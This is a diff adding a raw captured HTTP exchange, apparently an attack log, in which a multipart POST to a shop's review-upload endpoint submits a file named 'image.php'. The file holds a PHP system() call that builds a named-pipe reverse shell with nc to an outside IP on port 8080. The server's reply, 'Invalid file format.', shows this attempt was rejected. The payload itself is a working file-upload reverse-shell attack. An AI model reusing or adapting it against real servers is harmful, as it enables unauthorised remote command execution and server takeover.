@@ -1,0 +1,41 @@
+POST /reviews/upload.php HTTP/1.1
+Host: shoporoma.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------240702681933131672661702936221
+Content-Length: 688
+Origin: http://shoporoma.com
+Connection: keep-alive
+Referer: http://shoporoma.com/reviews/
+Upgrade-Insecure-Requests: 1
+
+-----------------------------240702681933131672661702936221
+Content-Disposition: form-data; name="name"
+
+asd
+-----------------------------240702681933131672661702936221
+Content-Disposition: form-data; name="email"
+
+asd@asd.com
+-----------------------------240702681933131672661702936221
+Content-Disposition: form-data; name="review"
+
+asd
+-----------------------------240702681933131672661702936221
+Content-Disposition: form-data; name="uploadedFile"; filename="image.php"
+Content-Type: application/x-php
+
+<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>
+
+-----------------------------240702681933131672661702936221--
+HTTP/1.1 200 OK
+Date: Thu, 30 Nov 2023 18:43:57 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Content-Length: 20
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+Invalid file format.
